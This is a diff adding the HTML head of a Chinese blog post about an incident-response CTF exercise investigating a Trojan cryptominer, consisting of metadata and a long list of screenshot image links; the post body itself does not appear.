@@ -1,0 +1,1602 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fufu.png">
+  <link rel="icon" href="/img/fufu.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Meiyouqian">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="特洛伊挖矿木马事件排查  真不是我说，这和我遇到的那个kdevtmpfsi听着怎么能那么像，真的没忍住来做一下，别告诉我真就是kdevtmpfsi 任务一：提交挖矿文件的绝对路径  上来找挖矿文件的绝对路径，既然题目说了是CPU使用率异常飙高，那我们就降序看看进程的CPU占用情况   先用top，发现没有了，可能是被感染了，那试试看ps aux 1ps aux --sort&#x3D;-%cpu | hea">
+<meta property="og:type" content="article">
+<meta property="og:title" content="应急响应练习：青少年CTF靶场（全）">
+<meta property="og:url" content="https://mei-you-qian.github.io/2026/01/02/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="玫幽倩的小博客">
+<meta property="og:description" content="特洛伊挖矿木马事件排查  真不是我说，这和我遇到的那个kdevtmpfsi听着怎么能那么像，真的没忍住来做一下，别告诉我真就是kdevtmpfsi 任务一：提交挖矿文件的绝对路径  上来找挖矿文件的绝对路径，既然题目说了是CPU使用率异常飙高，那我们就降序看看进程的CPU占用情况   先用top，发现没有了，可能是被感染了，那试试看ps aux 1ps aux --sort&#x3D;-%cpu | hea">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767000566941-9b5221a7-c7d1-41ba-9a56-941ac4bfd219.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767000512904-3909a3d9-59f5-46ac-939e-020d385b2a0a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059278935-4a2d1497-1327-4ce3-9bbd-d76e700694d5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767001706354-b7c1f9b2-f351-4952-82a5-69b2bd657c58.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767001902008-8772ab20-3494-4099-a2d7-867d5e76a7b2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767002156682-52ccedd3-0a07-4800-b9b7-c894d930638a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767002423576-75ed7fa5-686a-4c2d-bf56-09ddb22c1579.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1766397425604-b773e816-4931-4357-89c2-5a442a564ebe.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767002975109-23cf8c3c-e474-4994-82d3-f3a8231a3b47.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003065257-0b43cbc1-f4eb-4053-a0eb-77a4eb22788a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003217858-60c311a3-0b18-44ea-9577-987b78fb35da.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003303975-5cd326ae-1126-455e-bac4-96ad275f7d88.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003488693-2366ca66-017a-4789-9ddc-78390f874afa.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003686971-08a31f3c-f851-4a0b-9ed4-11d9dc1fa7e2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003922131-eedcef2c-ccb5-49ea-a0fb-b2d66a29de10.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004056435-de4b2456-91ee-4b3c-b3ca-78fa0c610c2b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004155454-1a131001-a778-4fdc-a634-40d3bedab905.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004476254-12d7d393-023b-443e-89ce-565e4ca87f0e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004613256-cc03a749-b459-4371-a581-a9afe5ee48f6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004640500-7cd382f9-7ad3-48ef-891f-9ad73c7b006a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004652054-c275adb3-8097-4d28-9bc4-5ba6e0ba8c46.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004679425-31e3492e-d1f8-4a0e-9dd6-6ff9b443e9ac.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004776072-06d87e14-1786-4c02-ae6e-6b52ccf067a4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004904742-7f2761e3-55a1-46a8-ab6c-4f4faaed2fbb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004930944-320d7887-7df6-4918-a31b-118a95009cb0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767005005437-40e1ca40-5330-4c33-a97d-1519e86366f7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767005025932-367bf42d-1a18-400b-91a1-9933b0c288a7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767005124090-08ac253a-d660-4368-b461-e0a0234610ed.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767005163694-877e6193-8618-4618-975b-407942052f02.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767005300416-4e43bb81-e83f-4f9b-bc03-d8ddb8245386.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058001167-173d2b6e-e74e-4ff8-97a2-2bf59d279822.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058058949-24115b6b-a479-4aaa-a5a3-86e648c8c3f0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058138867-b33db23e-5fed-4067-9995-f4f91a417b9b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058477947-d01515d6-a756-4bcc-9388-68e2975b2867.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058709436-6d471e2b-8878-4002-8d34-e60f951c5e25.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058728437-effc63c1-6024-4f85-a7d1-765ff566a6f8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058868301-f5b20850-5ada-4ce9-92d0-0117f7756ec5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767058997169-d9f5771b-f25c-42da-b7d9-c477e1ace0f5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059025707-992fd231-99c1-4d9f-a903-21398cec5f64.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059204659-ab3edb0d-d76f-419f-b832-f68734fcec9b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059229029-27d7ad8b-0b20-472f-b16d-c9ab161fb648.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059683436-352d3eab-1caf-4012-a9b5-3c209533ab2f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059769845-557a673c-0331-4224-9c69-d116551f50ce.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059814910-69dd766c-d45b-4971-88a9-246382e58fc5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767060958328-fe7e6b41-50fd-43d2-91aa-b62037b63a7e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767066323654-15634e0f-3dec-4802-a327-d4b7fb95985a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767066365124-623c0a7e-ce08-4c12-bb92-4b04b8434e85.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767066649152-a17985f0-cc3c-425b-82b4-f75167cfbda1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767066748563-0d63b657-cc29-4038-b87f-6b3a7d567c0f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067011458-cc454e05-9ff0-49b5-b1a2-460ba5226799.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067114237-49853f37-fd7a-4098-aba0-a6d3a75ccd8e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067209674-41bfcfdf-7f12-4c3d-b4f0-66f6f0026ad2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067255079-0ab5fae8-39ed-4a8b-bde4-e77702f11c32.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067277037-d7810223-d358-4adf-a3a0-9611d48ee49e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067427514-91da70b4-2feb-4566-ac3c-b450ccca43a0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067693546-00a892d7-fcc6-4158-b075-fb429363cca8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067725532-cf02901e-43c1-4013-b8e3-239e80feddfe.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067793136-0b059b91-4028-4fc7-a4e6-f24b522bd42c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767067806266-e817a4d7-8e4b-430f-a8bb-80c3892f5182.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767069758933-f0710b56-d748-41b7-9632-5ffe65a6c0a9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767069836658-72bdc5aa-adda-495e-bdf0-30670f7f268a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767069863230-f52723b1-ff5a-48fe-8516-6f5a2e8592ff.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070142787-d3454b46-0b4f-427d-93cb-edeb78115d93.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070254469-c35997d5-23a4-4c02-8f9c-640d2f5a886d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070271158-adba17f0-cffc-47fc-9f67-dfce03eb838e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070355958-e43f9883-d934-4ab9-b8fb-3cbd706217d8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070367833-049c1e8a-2fab-4b9d-bfd2-d0fd7dba4e64.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070419351-52caf25b-53df-4d6c-85f3-6296dc365f53.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070454075-d84dbe4a-0ebd-4050-a091-3b3e1450e1ee.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070572024-b8a6d244-22ab-4e15-903b-3e50f0409c96.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070615903-9298666c-13cd-447b-807c-917f34be06c8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070705173-77b89431-716c-4f31-9425-b28ecb9141d9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070802404-760a6c5c-f88e-4e34-8155-7a8f11690dcf.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767070886525-dd6594e3-331e-4f71-ba43-1498b758b57c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071079054-029fbcca-b491-4efd-b4ca-08d244af36f5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071104677-e230b794-f33e-4c36-a135-80dd30755b6f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071207014-e9c036b2-50c2-4494-9da9-01e4e5388c8f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071228195-0d461d16-3ebb-47e9-be97-4716b9d08caa.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071244170-6ecc7e33-db8f-4286-8916-7d47224a34ce.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071363298-229004a9-f5c2-41b4-81f2-10b0ac11b3dc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071372399-06c2700a-46a5-4214-8755-c00f32525a2e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071405161-434ee193-374d-460e-9346-c63ae6b2a1f4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071491397-bfdf052a-e1c9-483c-a3a6-7d69fbff5f31.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071962985-376fd0a4-9fd0-482a-95f4-57cb2145b5d3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072021183-f80ced46-c984-4ff4-9b52-e27fd0b99372.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072108103-d7cb52f4-0629-4171-b399-db2f3e627118.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072204217-3e647204-55fd-4011-a047-b5d9f254d689.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072248374-2a6022b7-1cde-4bad-bd0a-bce34ff8e620.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072321379-fac6415e-da3e-411e-96c2-ea0e279115a0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072388891-24fe07ca-611c-4c0f-a24a-bf2ed065f5a4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767094281741-c4c4589d-2855-4e80-80af-62996c35388a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767094443961-14b8cd47-da03-441a-b5e8-adeae05d9fd9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767094831694-6c05147b-284e-4290-91a1-370f9214520b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767095240717-404e84da-c129-4ff3-a158-fd90f8d50130.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767095530756-89b87a2a-fc65-464a-8440-41d2ec30b2a2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767095709035-bfd5e5f8-6100-44b5-8ed4-e9e77da6ae07.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767095975271-e652d388-0610-486d-a1c1-79bd80f8e1f4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767097169379-cfe626f8-1ea7-4ce5-b383-c537805fe2ae.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767097278034-6270211a-e989-4f71-837b-69fd2fbd0d09.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767152949208-02aaa43e-a0e0-40be-9bc4-a9afa9dd0c9b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767153543771-d9bc99e8-795d-4f2e-b5a1-a45dc8dc537f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767153697396-118691c8-14e6-49d5-af78-260cdda97e60.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767154504908-e657e3e4-b2ae-494b-b446-48b61623bf48.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767154559398-a0302362-d139-4296-8799-c71c475ee9ca.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767154889584-e863f6c1-d2c6-4316-950f-2314988171ed.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767155036440-a1b4aab3-4e9a-4c53-9dd2-ef7ae3d0c68c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767155208201-ece306c7-080b-49c8-940a-6ed8d81c925a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767156128551-02ec5817-937c-44e2-a98a-7a054cbe82c7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159055051-f14e3fc9-33b5-4bbf-8da2-76dd7f84b1b0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159072428-52943efd-af29-4db5-9958-007cdf13828f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159028119-9a4300a5-b4e1-4f25-8a84-605726eca684.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159352969-014f16b0-fb81-4c4f-a2ac-e2676f3429dd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159377376-ffaef7f7-3482-4202-ae34-674b2a50de1e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159544053-ada53cd4-8d28-4ae5-b07e-ef59f1c6804d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159790959-32a47889-ef11-4d35-9ec2-f313a2e371f5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159865768-0d66a919-db26-4dda-9202-7820b1794ce3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767160211549-f2e66b48-3948-48f4-b06f-05ae3b12a3ca.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767160289516-f928a254-b538-445c-a6ea-20e39e42bd9f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767160814780-baac8735-0b42-4acf-85b1-c6c910ec49c9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767160868841-a164a1aa-b86a-4b9b-b2b8-6a7bfcb1e0d1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767161699259-7ca300bb-73c5-4f2c-bcb0-a080a75e2147.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767161823318-8279ba79-cc37-4cd0-9d19-0e01fd503686.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767161887677-05934b5d-e007-4b94-8ce5-0225e7b4f380.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767272692792-9b0f783e-4521-441a-85de-c8d3d7675e6e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767272707966-6d323c44-83f5-4559-8fc4-88c8fc03e076.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767272999779-96921c96-de3a-4fbb-9352-8a1c1455257b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273056207-c5511ef9-407a-4e16-85f1-459792df8799.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273089553-a70da753-d39e-4e0d-8112-f4211f6cc8b8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273159292-eb686f17-e381-413b-9189-0f7e49808af4.png">
